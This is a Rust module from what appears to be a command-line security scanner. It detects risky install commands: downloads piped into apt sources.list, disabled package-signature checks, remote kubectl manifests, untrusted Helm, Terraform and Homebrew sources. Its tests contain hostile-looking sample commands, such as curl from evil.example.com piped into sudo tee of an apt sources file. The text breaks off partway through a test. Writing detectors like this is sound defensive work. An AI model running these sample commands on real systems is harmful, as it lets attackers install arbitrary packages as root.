//! Install-command rules — package-manager and infrastructure install patterns.
//!
//! These rules detect *dangerous patterns* in install commands, not the install
//! tools themselves. A legitimate `apt install foo`, `brew install foo`,
//! `kubectl apply -f ./local.yaml`, `terraform init`, or `helm install` from a
//! known chart repo must NOT fire — only the high-risk shapes do:
//!
//!  - Adding an apt repo from a piped download (`curl ... | sudo tee
//!    .../sources.list.d/...`).
//!  - Disabled signature verification: apt `[trusted=yes]` /
//!    `--allow-unauthenticated`, dnf `--nogpgcheck` / `gpgcheck=0`, pacman
//!    `SigLevel = Never`.
//!  - `kubectl apply -f` against a raw remote URL or a shortened URL.
//!  - `helm install` / `helm repo add` from an untrusted remote chart repo.
//!  - `terraform` modules sourced from an untrusted remote location.
//!  - `brew install` / `brew tap` from an arbitrary URL.
//!
//! Item 4 (M3 chunk 1) is pure pattern detection — no network, no registry
//! lookups on the hot path.

use crate::redact;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Run install-command rules over a tokenized command line.
pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
    let mut findings = Vec::new();
    let segments = tokenize::tokenize(input, shell);

    check_repo_add_from_pipe(&segments, shell, &mut findings);
    check_unsigned_repo_trust(&segments, shell, &mut findings);
    check_gpg_check_disabled(&segments, shell, &mut findings);
    check_kubectl_apply_remote(&segments, shell, &mut findings);
    check_helm_untrusted_repo(&segments, shell, &mut findings);
    check_terraform_remote_module(&segments, shell, &mut findings);
    check_brew_untrusted_tap(&segments, shell, &mut findings);

    findings
}

/// Strip a single matching layer of surrounding quotes (single or double).
fn strip_quotes(s: &str) -> &str {
    let t = s.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        &t[1..t.len() - 1]
    } else {
        t
    }
}

/// Effective command base name: path basename, lowercased, `.exe` stripped.
fn cmd_base(raw: &str, shell: ShellType) -> String {
    let unq = strip_quotes(raw);
    let after_path = match shell {
        ShellType::PowerShell | ShellType::Cmd => unq.rsplit(['/', '\\']).next().unwrap_or(unq),
        _ => unq.rsplit('/').next().unwrap_or(unq),
    };
    let lower = after_path.to_lowercase();
    lower
        .strip_suffix(".exe")
        .map(str::to_string)
        .unwrap_or(lower)
}

/// Resolve a segment's effective command + args, transparently stepping past a
/// single leading `sudo` / `doas` privilege wrapper (and its value-taking flags).
///
/// Install commands are very commonly run under `sudo`; if the rules read
/// `segment.command` directly, `sudo apt-get ...` would never be inspected.
/// One level of unwrapping covers the realistic cases without the full wrapper
/// machinery in `command.rs`.
fn resolve_command(seg: &tokenize::Segment, shell: ShellType) -> Option<(String, &[String])> {
    let cmd = seg.command.as_deref()?;
    let base = cmd_base(cmd, shell);
    if base != "sudo" && base != "doas" {
        return Some((base, seg.args.as_slice()));
    }

    // Step past sudo/doas flags. `-u`/`-g`/`-C`/`-h`/`--user=`/etc. take a value.
    let value_short = ["-u", "-g", "-C", "-h", "-p", "-r", "-t", "-D", "-R", "-T"];
    let value_long = [
        "--user", "--group", "--chdir", "--host", "--prompt", "--role", "--type",
    ];
    let mut idx = 0;
    while idx < seg.args.len() {
        let a = strip_quotes(&seg.args[idx]);
        if a == "--" {
            idx += 1;
            break;
        }
        if let Some(stripped) = a.strip_prefix("--") {
            let key_takes_value = value_long.contains(&a);
            // `--user=root` carries its own value; `--user root` consumes next.
            if key_takes_value && !stripped.contains('=') {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if a.starts_with('-') && a.len() > 1 {
            if value_short.contains(&a) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        break;
    }
    let inner = seg.args.get(idx)?;
    let inner_base = cmd_base(inner, shell);
    Some((inner_base, &seg.args[idx + 1..]))
}

/// Whether a normalized arg looks like a remote `http(s)://` or `ftp://` URL.
fn is_remote_url(value: &str) -> bool {
    let v = value.to_ascii_lowercase();
    v.starts_with("http://") || v.starts_with("https://") || v.starts_with("ftp://")
}

/// Host of a git remote, accepting both `scheme://[user@]host/…` URLs and
/// SCP-style SSH remotes (`[user@]host:path`, e.g. `git@github.com:u/r.git`).
fn git_remote_host(remote: &str) -> Option<String> {
    if let Some(h) = url_host(remote) {
        return Some(h);
    }
    // SCP syntax has no `://`; the host sits between an optional `user@` and
    // the first `:`.
    if remote.contains("://") {
        return None;
    }
    let after_user = match remote.split_once('@') {
        Some((_, rest)) => rest,
        None => remote,
    };
    let (host, _) = after_user.split_once(':')?;
    if host.is_empty() || host.contains('/') {
        return None;
    }
    Some(host.to_ascii_lowercase())
}

/// Extract the host portion of a remote URL (after scheme + optional userinfo,
/// before the first `/`, `?` or `#`, port stripped).
fn url_host(url: &str) -> Option<String> {
    let after_scheme = url.split_once("://").map(|(_, rest)| rest)?;
    let after_userinfo = match after_scheme.split_once('@') {
        Some((_, host)) => host,
        None => after_scheme,
    };
    let host_port = after_userinfo
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(after_userinfo);
    let host = match host_port.rsplit_once(':') {
        Some((h, port)) if port.chars().all(|c| c.is_ascii_digit()) && !port.is_empty() => h,
        _ => host_port,
    };
    if host.is_empty() {
        None
    } else {
        Some(host.to_ascii_lowercase())
    }
}

/// Known URL-shortener hosts — same set as the transport `shortened_url` rule.
/// A shortened URL hides the real install source entirely.
const URL_SHORTENERS: &[&str] = &[
    "bit.ly",
    "t.co",
    "tinyurl.com",
    "is.gd",
    "v.gd",
    "goo.gl",
    "ow.ly",
    "rebrand.ly",
    "cutt.ly",
    "shorturl.at",
];

fn is_shortener_url(url: &str) -> bool {
    url_host(url)
        .map(|h| URL_SHORTENERS.iter().any(|s| h == *s))
        .unwrap_or(false)
}

/// Hosts serving *raw* file content — a raw URL here is a script/manifest blob,
/// not a reviewable project page. Used to flag "raw remote URL posing as an
/// installer / manifest".
fn is_raw_content_host(host: &str) -> bool {
    matches!(
        host,
        "raw.githubusercontent.com"
            | "raw.github.com"
            | "gist.githubusercontent.com"
            | "raw.gitlab.com"
            | "gitlab.com" // gitlab raw lives under /-/raw/, handled by path check
            | "bitbucket.org"
            | "objects.githubusercontent.com"
            | "codeload.github.com"
            | "pastebin.com"
            | "paste.ee"
            | "0x0.st"
            | "transfer.sh"
    )
}

/// Whether a URL points at raw/blob content (raw host, or a `.../raw/...` or
/// release-tarball path on a code-hosting site).
fn is_raw_remote_manifest(url: &str) -> bool {
    let Some(host) = url_host(url) else {
        return false;
    };
    let lower = url.to_ascii_lowercase();
    if is_raw_content_host(&host) {
        // gitlab/bitbucket only count as "raw" when the path actually is raw.
        if host == "gitlab.com" || host == "bitbucket.org" {
            return lower.contains("/-/raw/") || lower.contains("/raw/");
        }
        return true;
    }
    // GitHub release / archive tarballs posing as installers.
    if host == "github.com"
        && (lower.contains("/archive/") || lower.contains("/releases/download/"))
    {
        return true;
    }
    false
}

// ── repo_add_from_pipe ───────────────────────────────────────────────────────

/// Whether the raw segment contains a `>` / `>>` redirect whose target is an
/// apt sources.list file. Tolerant of the redirect operator being glued to the
/// path (`>/etc/apt/...`) or separated by whitespace.
fn redirect_targets_sources_list(raw: &str) -> bool {
    let lower = raw.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'>' {
            // Skip `>>` and any following whitespace, then read the redirect
            // target token.
            let mut j = i + 1;
            while j < bytes.len() && bytes[j] == b'>' {
                j += 1;
            }
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            let target_start = j;
            while j < bytes.len() && !bytes[j].is_ascii_whitespace() {
                j += 1;
            }
            let target = &lower[target_start..j];
            if target.contains("sources.list") {
                return true;
            }
            i = j.max(i + 1);
        } else {
            i += 1;
        }
    }
    false
}

/// `curl ... | sudo tee /etc/apt/sources.list.d/foo.list` — adds an apt repo
/// from an unverified piped download. Also catches the redirect form
/// (`curl ... > .../sources.list.d/...`).
fn check_repo_add_from_pipe(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    let sources_list_marker = |s: &str| {
        let l = s.to_ascii_lowercase();
        l.contains("sources.list.d/") || l.ends_with("sources.list") || l.contains("/sources.list")
    };

    // Pipe form: a stage whose resolved command is `tee` and whose args touch a
    // sources.list path, preceded by a `|` separator (the upstream stage is the
    // download).
    for (i, seg) in segments.iter().enumerate() {
        if i == 0 {
            continue;
        }
        let is_pipe = matches!(seg.preceding_separator.as_deref(), Some("|") | Some("|&"));
        if !is_pipe {
            continue;
        }
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "tee" {
            continue;
        }
        let touches_sources = args.iter().any(|a| sources_list_marker(strip_quotes(a)));
        if !touches_sources {
            continue;
        }
        // The upstream stage should be a network fetch for this to be a
        // pipe-from-download; a local `cat` into tee is not the attack.
        let upstream_base = segments[i - 1]
            .command
            .as_deref()
            .map(|c| cmd_base(c, shell))
            .unwrap_or_default();
        if !is_fetch_command(&upstream_base) {
            continue;
        }
        push_repo_add(segments, i, shell, findings);
        return;
    }

    // Redirect form: `curl ... > /etc/apt/sources.list.d/foo.list` (the `>` may
    // or may not be followed by whitespace).
    for seg in segments {
        let Some((base, _)) = resolve_command(seg, shell) else {
            continue;
        };
        if !is_fetch_command(&base) {
            continue;
        }
        if redirect_targets_sources_list(&seg.raw) {
            findings.push(Finding {
                rule_id: RuleId::RepoAddFromPipe,
                severity: Severity::High,
                title: "APT repository added from an unverified download".to_string(),
                description:
                    "A download is redirected straight into an apt sources.list file. The repo \
                     definition is never reviewed and its signing key is not verified — a \
                     compromised or spoofed source can then install arbitrary packages."
                        .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "fetch redirected to sources.list".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

fn push_repo_add(
    segments: &[tokenize::Segment],
    tee_idx: usize,
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    let upstream = &segments[tee_idx - 1];
    let pipeline = format!("{} | {}", upstream.raw, segments[tee_idx].raw);
    let mut evidence = vec![Evidence::CommandPattern {
        pattern: "fetch | tee sources.list".to_string(),
        matched: redact::redact_shell_assignments(&pipeline),
    }];
    for url in extract_remote_urls(&upstream.args, shell) {
        evidence.push(Evidence::Url { raw: url });
    }
    findings.push(Finding {
        rule_id: RuleId::RepoAddFromPipe,
        severity: Severity::High,
        title: "APT repository added from a piped download".to_string(),
        description:
            "A downloaded payload is piped through `tee` into an apt sources.list file. The repo \
             definition is never reviewed and its signing key is not verified — a compromised or \
             spoofed source can then install arbitrary packages as root."
                .to_string(),
        evidence,
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    });
}

// ── unsigned_repo_trust ─────────────────────────────────────────────────────

/// apt repos with signature verification turned off:
///  - `[trusted=yes]` option inside a sources entry,
///  - `--allow-unauthenticated`,
///  - `--allow-insecure-repositories`.
fn check_unsigned_repo_trust(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        let is_apt = matches!(
            base.as_str(),
            "apt" | "apt-get" | "aptitude" | "add-apt-repository"
        );

        // `[trusted=yes]` can appear anywhere in the raw segment — it is part of
        // a sources-list entry string, e.g.
        //   echo 'deb [trusted=yes] http://repo ./' > /etc/apt/sources.list.d/x.list
        // The marker itself is the danger regardless of the leading command.
        if raw_has_trusted_yes(&seg.raw) {
            findings.push(Finding {
                rule_id: RuleId::UnsignedRepoTrust,
                severity: Severity::High,
                title: "APT source marked [trusted=yes]".to_string(),
                description:
                    "An apt sources entry uses `[trusted=yes]`, which disables GPG signature \
                     verification for that repository. Packages from it are installed without \
                     any authenticity check."
                        .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "apt [trusted=yes]".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }

        if !is_apt {
            continue;
        }
        for arg in args {
            let a = strip_quotes(arg).to_ascii_lowercase();
            if a == "--allow-unauthenticated" || a == "--allow-insecure-repositories" {
                findings.push(Finding {
                    rule_id: RuleId::UnsignedRepoTrust,
                    severity: Severity::High,
                    title: "APT signature verification disabled".to_string(),
                    description: format!(
                        "`{a}` tells apt to install packages even when their GPG signature \
                         cannot be verified. This removes the authenticity guarantee for every \
                         package in the transaction."
                    ),
                    evidence: vec![Evidence::CommandPattern {
                        pattern: "apt unauthenticated flag".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                return;
            }
        }
    }
}

/// Detect a `[trusted=yes]` apt option, tolerating extra spaces and other
/// options inside the brackets (`[arch=amd64 trusted=yes]`).
fn raw_has_trusted_yes(raw: &str) -> bool {
    let lower = raw.to_ascii_lowercase();
    let mut search = lower.as_str();
    while let Some(open) = search.find('[') {
        let rest = &search[open + 1..];
        if let Some(close) = rest.find(']') {
            let inside = &rest[..close];
            for opt in inside.split_whitespace() {
                if let Some((k, v)) = opt.split_once('=') {
                    if k.trim() == "trusted" && v.trim() == "yes" {
                        return true;
                    }
                }
            }
            search = &rest[close + 1..];
        } else {
            break;
        }
    }
    false
}

// ── gpg_check_disabled ──────────────────────────────────────────────────────

/// Disabled GPG/signature checks for dnf/yum/zypper and pacman:
///  - `--nogpgcheck` flag,
///  - `gpgcheck=0` (a yum/dnf .repo setting passed inline),
///  - pacman `SigLevel = Never`.
fn check_gpg_check_disabled(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    // `gpgcheck=0` / `SigLevel = Never` are config-line markers that can appear
    // in a raw segment regardless of the leading command (e.g. an `echo` into a
    // .repo / pacman.conf file).
    for seg in segments {
        if raw_has_gpgcheck_zero(&seg.raw) {
            findings.push(Finding {
                rule_id: RuleId::GpgCheckDisabled,
                severity: Severity::High,
                title: "Package signature checking disabled (gpgcheck=0)".to_string(),
                description: "A yum/dnf repository configuration sets `gpgcheck=0`, disabling GPG \
                     signature verification. Packages from that repo are installed without an \
                     authenticity check."
                    .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "gpgcheck=0".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
        if raw_has_siglevel_never(&seg.raw) {
            findings.push(Finding {
                rule_id: RuleId::GpgCheckDisabled,
                severity: Severity::High,
                title: "pacman signature checking disabled (SigLevel = Never)".to_string(),
                description: "A pacman configuration sets `SigLevel = Never`, disabling package \
                     signature verification. pacman will install unsigned or tampered packages \
                     without warning."
                    .to_string(),
                evidence: vec![Evidence::CommandPattern {
                    pattern: "pacman SigLevel = Never".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }

    // `--nogpgcheck` flag — only meaningful on dnf/yum/zypper/pacman.
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        let is_rpm_pm = matches!(
            base.as_str(),
            "dnf" | "yum" | "zypper" | "microdnf" | "pacman"
        );
        if !is_rpm_pm {
            continue;
        }
        for arg in args {
            let a = strip_quotes(arg).to_ascii_lowercase();
            if a == "--nogpgcheck" {
                findings.push(Finding {
                    rule_id: RuleId::GpgCheckDisabled,
                    severity: Severity::High,
                    title: "Package signature checking disabled (--nogpgcheck)".to_string(),
                    description: format!(
                        "`{base} --nogpgcheck` installs packages without verifying their GPG \
                         signatures. A spoofed or compromised mirror can serve arbitrary \
                         packages that will be installed without warning."
                    ),
                    evidence: vec![Evidence::CommandPattern {
                        pattern: "--nogpgcheck flag".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                return;
            }
        }
    }
}

/// `gpgcheck=0` / `gpgcheck = 0` anywhere in the raw text (case-insensitive).
fn raw_has_gpgcheck_zero(raw: &str) -> bool {
    let lower = raw.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    // `match_indices` yields absolute offsets into `lower`, so the word-boundary
    // check below indexes `bytes` correctly even for the 2nd+ occurrence.
    for (pos, _) in lower.match_indices("gpgcheck") {
        let after_ws = lower[pos + "gpgcheck".len()..].trim_start();
        if let Some(rest) = after_ws.strip_prefix('=') {
            let val = rest.trim_start();
            // Match `0` as a whole token (not the `0` in `0755` etc.).
            if val.starts_with('0')
                && val[1..]
                    .chars()
                    .next()
                    .map(|c| !c.is_ascii_alphanumeric())
                    .unwrap_or(true)
            {
                // Require `gpgcheck` to start at a word boundary.
                let boundary_ok =
                    pos == 0 || (!bytes[pos - 1].is_ascii_alphanumeric() && bytes[pos - 1] != b'_');
                if boundary_ok {
                    return true;
                }
            }
        }
    }
    false
}

/// pacman `SigLevel = Never` (case-insensitive, tolerant of spacing).
fn raw_has_siglevel_never(raw: &str) -> bool {
    let lower = raw.to_ascii_lowercase();
    let mut search = lower.as_str();
    while let Some(pos) = search.find("siglevel") {
        let after = &search[pos + "siglevel".len()..];
        let after_ws = after.trim_start();
        if let Some(rest) = after_ws.strip_prefix('=') {
            if rest.trim_start().starts_with("never") {
                return true;
            }
        }
        search = &search[pos + "siglevel".len()..];
    }
    false
}

// ── kubectl_apply_remote ────────────────────────────────────────────────────

/// `kubectl apply -f <remote URL>` where the URL is a raw remote manifest or a
/// shortened URL. A plain `kubectl apply -f ./local.yaml` or `-k ./overlay`
/// must NOT fire.
fn check_kubectl_apply_remote(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "kubectl" && base != "oc" {
            continue;
        }
        // Only mutating subcommands that take a manifest file.
        let subcmd = args
            .iter()
            .find(|a| !strip_quotes(a).starts_with('-'))
            .map(|a| strip_quotes(a).to_ascii_lowercase());
        if !matches!(
            subcmd.as_deref(),
            Some("apply") | Some("create") | Some("replace")
        ) {
            continue;
        }

        for url in collect_flag_values(args, &["-f", "--filename"], shell) {
            if !is_remote_url(&url) {
                continue;
            }
            let shortened = is_shortener_url(&url);
            let (severity, why) = if shortened {
                (
                    Severity::High,
                    "a shortened URL that hides the real manifest location",
                )
            } else if is_raw_remote_manifest(&url) {
                (
                    Severity::High,
                    "a raw remote manifest blob fetched without review",
                )
            } else {
                (
                    Severity::Medium,
                    "a remote URL — the manifest is fetched and applied without local review",
                )
            };
            findings.push(Finding {
                rule_id: RuleId::KubectlApplyRemote,
                severity,
                title: format!(
                    "kubectl {} from a remote manifest",
                    subcmd.as_deref().unwrap_or("apply")
                ),
                description: format!(
                    "`kubectl {} -f` is given {why}. The manifest can create privileged \
                     workloads, RBAC bindings, or admission webhooks in the cluster, and its \
                     contents are not inspected before being applied.",
                    subcmd.as_deref().unwrap_or("apply")
                ),
                evidence: vec![
                    Evidence::CommandPattern {
                        pattern: "kubectl apply -f remote".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    },
                    Evidence::Url { raw: url },
                ],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

// ── helm_untrusted_repo ─────────────────────────────────────────────────────

/// Well-known Helm chart repository hosts. A `helm repo add` / `helm install`
/// pointed elsewhere is flagged so the operator confirms the chart source.
const TRUSTED_HELM_HOSTS: &[&str] = &[
    "charts.helm.sh",
    "kubernetes-charts.storage.googleapis.com",
    "charts.bitnami.com",
    "registry-1.docker.io",
    "ghcr.io",
    "quay.io",
    "k8s.gcr.io",
    "registry.k8s.io",
    "prometheus-community.github.io",
    "grafana.github.io",
    "charts.jetstack.io",
    "helm.elastic.co",
    "argoproj.github.io",
    "kubernetes.github.io",
];

/// `helm install`/`helm repo add` pointed at an untrusted remote chart repo,
/// or a chart fetched directly from a raw remote URL.
fn check_helm_untrusted_repo(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "helm" {
            continue;
        }
        let positionals: Vec<&str> = args
            .iter()
            .map(|a| strip_quotes(a))
            .filter(|a| !a.starts_with('-'))
            .collect();
        let subcmd = positionals.first().map(|s| s.to_ascii_lowercase());

        // Any remote URL among the helm args (chart URL, `--repo <url>`, repo
        // add target). `helm install foo ./local-chart` stays clean.
        let mut remote_url = None;
        for arg in args {
            let v = strip_quotes(arg);
            // `--repo=https://...`
            let candidate = if let Some((flag, val)) = v.split_once('=') {
                if flag == "--repo" || flag == "--repository" {
                    Some(val)
                } else if is_remote_url(v) {
                    Some(v)
                } else {
                    None
                }
            } else if is_remote_url(v) {
                Some(v)
            } else {
                None
            };
            if let Some(c) = candidate {
                if is_remote_url(c) {
                    remote_url = Some(c.to_string());
                    break;
                }
            }
        }
        // `--repo <url>` (separate token).
        if remote_url.is_none() {
            for url in collect_flag_values(args, &["--repo", "--repository"], shell) {
                if is_remote_url(&url) {
                    remote_url = Some(url);
                    break;
                }
            }
        }

        let Some(url) = remote_url else {
            continue;
        };
        // Only the subcommands that actually pull/use a chart.
        if !matches!(
            subcmd.as_deref(),
            Some("install")
                | Some("upgrade")
                | Some("repo")
                | Some("pull")
                | Some("fetch")
                | Some("template")
        ) {
            continue;
        }

        let host = url_host(&url).unwrap_or_default();
        let trusted = TRUSTED_HELM_HOSTS
            .iter()
            .any(|t| host == *t || host.ends_with(&format!(".{t}")));
        if trusted {
            continue;
        }

        findings.push(Finding {
            rule_id: RuleId::HelmUntrustedRepo,
            severity: Severity::Medium,
            title: "Helm chart from an untrusted repository".to_string(),
            description: format!(
                "A `helm {}` command pulls a chart from '{host}', which is not a recognized \
                 chart repository. A Helm chart can deploy privileged workloads and cluster \
                 RBAC — confirm the chart source is trusted.",
                subcmd.as_deref().unwrap_or("install")
            ),
            evidence: vec![
                Evidence::CommandPattern {
                    pattern: "helm untrusted repo".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                },
                Evidence::Url { raw: url },
            ],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        return;
    }
}

// ── terraform_remote_module ─────────────────────────────────────────────────

/// `terraform` invoked with a module/config sourced from an untrusted remote
/// location: `init -from-module=<remote>` or `-from-module <remote>`.
///
/// A plain `terraform init` / `terraform get` (modules declared in `.tf` files)
/// must NOT fire — the `.tf` source strings are out of scope for a command-line
/// rule and are handled by config-file scanning.
fn check_terraform_remote_module(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "terraform" && base != "tofu" {
            continue;
        }

        for source in collect_flag_values(args, &["-from-module", "--from-module"], shell) {
            // Local relative/absolute paths are fine.
            if !is_untrusted_module_source(&source) {
                continue;
            }
            findings.push(Finding {
                rule_id: RuleId::TerraformRemoteModule,
                severity: Severity::Medium,
                title: "Terraform module from an untrusted remote source".to_string(),
                description: format!(
                    "`terraform init -from-module` copies a root module from '{source}'. A \
                     remote Terraform module runs with your full cloud credentials on `apply` \
                     and can provision arbitrary infrastructure — verify the module source."
                ),
                evidence: vec![
                    Evidence::CommandPattern {
                        pattern: "terraform -from-module remote".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    },
                    Evidence::Text {
                        detail: format!("module source: {source}"),
                    },
                ],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

/// Whether a Terraform module source string is an untrusted *remote* source.
///
/// Trusted / local: a relative path (`./`, `../`), an absolute path (`/`), or
/// the Terraform Registry (`registry.terraform.io`, or a bare
/// `namespace/name/provider` registry shorthand).
fn is_untrusted_module_source(source: &str) -> bool {
    let s = source.trim();
    if s.is_empty() {
        return false;
    }
    // Local filesystem paths.
    if s.starts_with("./") || s.starts_with("../") || s.starts_with('/') || s.starts_with('.') {
        return false;
    }
    let lower = s.to_ascii_lowercase();
    // Terraform Registry (explicit host or registry shorthand `ns/name/provider`).
    if lower.starts_with("registry.terraform.io/") || lower.starts_with("app.terraform.io/") {
        return false;
    }
    // Registry shorthand: exactly three `/`-separated non-URL components.
    if !lower.contains("://")
        && !lower.contains('@')
        && lower.split('/').count() == 3
        && !lower.contains('.')
    {
        return false;
    }
    // Everything else — git::, http(s)://, github.com/..., S3/GCS buckets,
    // raw archive URLs — is a remote source worth confirming.
    true
}

// ── brew_untrusted_tap ──────────────────────────────────────────────────────

/// `brew install <url>` (formula from an arbitrary URL) or `brew tap <user/repo>
/// <url>` (tap pointed at an arbitrary git remote). A plain `brew install foo`
/// or a tap of a `github.com` repo without an explicit URL stays clean.
fn check_brew_untrusted_tap(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "brew" {
            continue;
        }
        let subcmd = args
            .iter()
            .find(|a| !strip_quotes(a).starts_with('-'))
            .map(|a| strip_quotes(a).to_ascii_lowercase());

        match subcmd.as_deref() {
            Some("install") | Some("reinstall") | Some("upgrade") => {
                for arg in args {
                    let v = strip_quotes(arg);
                    if is_remote_url(v) {
                        findings.push(Finding {
                            rule_id: RuleId::BrewUntrustedTap,
                            severity: Severity::High,
                            title: "Homebrew formula installed from an arbitrary URL".to_string(),
                            description:
                                "`brew install` is given a raw URL instead of a formula name. \
                                 Homebrew fetches and runs that Ruby formula directly, with no \
                                 review and outside any audited tap."
                                    .to_string(),
                            evidence: vec![
                                Evidence::CommandPattern {
                                    pattern: "brew install <url>".to_string(),
                                    matched: redact::redact_shell_assignments(&seg.raw),
                                },
                                Evidence::Url { raw: v.to_string() },
                            ],
                            human_view: None,
                            agent_view: None,
                            mitre_id: None,
                            custom_rule_id: None,
                        });
                        return;
                    }
                }
            }
            Some("tap") => {
                // `brew tap user/repo https://custom.git` — the explicit URL
                // means the tap is NOT the implied github.com/<user>/homebrew-<repo>.
                for arg in args {
                    let v = strip_quotes(arg);
                    if is_remote_url(v) || v.ends_with(".git") {
                        // `git_remote_host` handles both `https://` URLs and
                        // SCP-style SSH remotes (`git@github.com:u/r.git`).
                        let host = git_remote_host(v).unwrap_or_default();
                        // A github.com/gitlab.com tap URL is the normal case.
                        let benign_host = host == "github.com"
                            || host == "gitlab.com"
                            || host == "bitbucket.org"
                            || host.ends_with(".github.com")
                            || host.ends_with(".gitlab.com");
                        if benign_host {
                            continue;
                        }
                        findings.push(Finding {
                            rule_id: RuleId::BrewUntrustedTap,
                            severity: Severity::Medium,
                            title: "Homebrew tap from an arbitrary git remote".to_string(),
                            description:
                                "`brew tap` is pointed at an explicit git URL rather than the \
                                 default GitHub-hosted tap. Every formula in a tap is executable \
                                 Ruby — confirm the tap is from a source you trust."
                                    .to_string(),
                            evidence: vec![Evidence::CommandPattern {
                                pattern: "brew tap <url>".to_string(),
                                matched: redact::redact_shell_assignments(&seg.raw),
                            }],
                            human_view: None,
                            agent_view: None,
                            mitre_id: None,
                            custom_rule_id: None,
                        });
                        return;
                    }
                }
            }
            _ => {}
        }
    }
}

// ── shared helpers ──────────────────────────────────────────────────────────

/// Network-fetch commands whose output, piped into `tee`/redirected, means a
/// repo definition came straight off the wire.
fn is_fetch_command(base: &str) -> bool {
    matches!(
        base,
        "curl" | "wget" | "http" | "https" | "xh" | "fetch" | "aria2c"
    )
}

/// Collect the values of repeatable `-f file` / `--flag value` / `--flag=value`
/// options from an arg list.
fn collect_flag_values(args: &[String], flags: &[&str], _shell: ShellType) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = strip_quotes(&args[i]);
        if let Some((flag, val)) = a.split_once('=') {
            if flags.contains(&flag) {
                out.push(val.to_string());
            }
        } else if flags.contains(&a) {
            if let Some(next) = args.get(i + 1) {
                out.push(strip_quotes(next).to_string());
                i += 2;
                continue;
            }
        }
        i += 1;
    }
    out
}

/// Extract all remote `http(s)`/`ftp` URLs from an arg list (bare or
/// `--flag=URL`).
fn extract_remote_urls(args: &[String], _shell: ShellType) -> Vec<String> {
    let mut urls = Vec::new();
    for arg in args {
        let v = strip_quotes(arg);
        if is_remote_url(v) {
            urls.push(v.to_string());
        } else if let Some((_, val)) = v.split_once('=') {
            if is_remote_url(val) {
                urls.push(val.to_string());
            }
        }
    }
    urls
}

#[cfg(test)]
mod tests {
    use super::*;

    fn has(input: &str, shell: ShellType, rule: RuleId) -> bool {
        check(input, shell).iter().any(|f| f.rule_id == rule)
    }

    fn none(input: &str, shell: ShellType) -> bool {
        check(input, shell).is_empty()
    }

    // ── repo_add_from_pipe ──────────────────────────────────────────────────

    #[test]
    fn test_curl_pipe_tee_sources_list() {
        assert!(has(
            "curl -fsSL https://evil.example.com/repo.list | sudo tee /etc/apt/sources.list.d/evil.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_wget_pipe_tee_sources_list_no_sudo() {
        assert!(has(
            "wget -qO- https://x.example.com/r | tee /etc/apt/sources.list.d/x.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_curl_redirect_sources_list() {
        assert!(has(
            "curl https://x.example.com/r > /etc/apt/sources.list.d/x.list",
            ShellType::Posix,
